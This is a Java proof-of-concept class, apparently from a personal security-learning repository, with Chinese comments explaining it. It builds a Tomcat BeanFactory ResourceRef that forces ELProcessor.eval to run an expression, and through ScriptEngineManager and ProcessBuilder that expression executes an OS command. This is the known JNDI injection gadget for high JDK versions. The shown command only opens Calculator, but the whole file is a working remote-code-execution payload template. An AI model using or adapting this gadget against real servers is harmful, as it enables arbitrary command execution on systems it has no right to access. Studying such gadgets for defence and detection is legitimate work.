package com.xjjlearning.hack.java.highjdk.poc;

import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

/**
 * Created by xjj on 2023/5/6.
 */
public class TomcatELProcessor implements Payload {

    @Override
    public ResourceRef getPayload() {
//        ELProcessor
        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
//        // 强制将 'x' 属性的setter 从 'setX' 变为 'eval', 详细逻辑见 BeanFactory.getObjectInstance 代码
//        ref.add(new StringRefAddr("forceString", "bitterz=eval"));
        // 指定bitterz属性指定其setter方法需要的参数，实际是ElProcessor.eval方法执行的参数，利用表达式执行命令
//        ref.add(new StringRefAddr("bitterz", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));

        ref.add(new StringRefAddr("forceString", "x=eval")); // name=method, x属性使用eval这个setter赋值
        // 给x使用setter赋值时传入的参数
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['open', '/System/Applications/Calculator.app']).start()\")"));

        // 这个eval是如何写出的？ -> EL表达式
        // ScriptEngineManager支持java和其他语言互相调用
        // Class.newInstance()只能反射无参的构造器
//        ScriptEngineManager m = (ScriptEngineManager) "".getClass().forName("javax.script.ScriptEngineManager").newInstance();
//        m.getEngineByName("JavaScript").eval("");
        return ref;
    }
}
